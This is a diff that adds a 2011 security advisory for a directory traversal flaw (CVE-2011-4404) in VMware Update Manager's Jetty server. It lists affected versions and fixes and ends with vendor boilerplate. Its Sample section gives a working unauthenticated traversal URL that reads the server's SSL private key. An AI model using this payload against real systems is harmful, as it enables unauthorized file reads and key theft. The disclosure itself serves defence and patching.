@@ -1,0 +1,66 @@
+# Exploit Title:VMware Update Manager Directory Traversal
+# Date:18/11/2011
+# Author: Alexey Sintsov
+# Software Link: http://www.vmware.com/
+# Version:2.0.2
+# Tested on: Windows 2003 / vCenter Update Manager 4.1 U1
+# CVE : CVE-2011-4404
+
+DSECRG-11-042 VMware Update Manager - Directory Traversal
+
+
+Application: VMware Update Manager
+Versions Affected: vCenter Update Manager 4.1 prior to Update 2, vCenter Update Manager 4.0 prior to Update 4
+Vendor URL: http://vmware.com
+Bugs: Directory Traversal File Read
+CVE: CVE-2011-4404
+CVSS2: 7.8
+Exploits: YES
+Reported: 06.06.2010
+Vendor response: 06.06.2010
+Date of Public Advisory: 18.11.2011
+Authors: Alexey Sintsov
+Digital Security Research Group [DSecRG] (research [at] dsecrg [dot]com)
+
+Description
+********
+Directory Traversal vulnerability was found in Jetty web server that is used by VMware Update manager.
+
+Details
+*******
+Directory Traversal vulnerability was found in Jetty web server that is used by VUM.
+With this vulnerability, an non-authenticated attacker can read any file on the server (with rights of the process).
+
+Sample
+******
+http://<target>:9084/vci/downloads/.\..\..\..\..\..\..\..\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\SSL\rui.key
+
+
+References
+**********
+
+http://dsecrg.com/pages/vul/show.php?id=342
+http://www.vmware.com/security/advisories/VMSA-2011-0014.html
+
+
+Fix Information
+*************
+
+Vendor make fix for this issue:
+Fixed in Update Manager 5.0 Windows not affected
+Fixed in Update Manager 4.1 Windows Update 2
+Fixed in Update Manager 4.0 Windows Update 4
+
+About DSecRG
+*******
+The main mission of DSecRG is to conduct researches of business critical systems such as ERP, CRM, SRM, BI, SCADA, banking software and others. The result of this work is then integrates in ERPScan Security Scanner. Being on the top edge of ERP and SAP security DSecRG research helps to improve a quality of ERPScan consulting services and protects you from the latest threads. 
+Contact: research [at] dsecrg [dot] com
+http://www.dsecrg.com 
+
+About ERPScan
+*******
+ERPScan is an innovative company engaged in the research of ERP security and develops products for ERP system security assessment. Apart from this the company renders consulting services for secure configuration, development and implementation of ERP systems, and conducts comprehensive assessments and penetration testing of custom solutions.
+Our flagship products are "ERPScan Security Scanner for SAP" and service "ERPScan Online" which can help customers to perform automated security assessments and compliance checks for SAP solutions.
+
+Contact: info [at] erpscan [dot] com
+http://www.erpscan.com
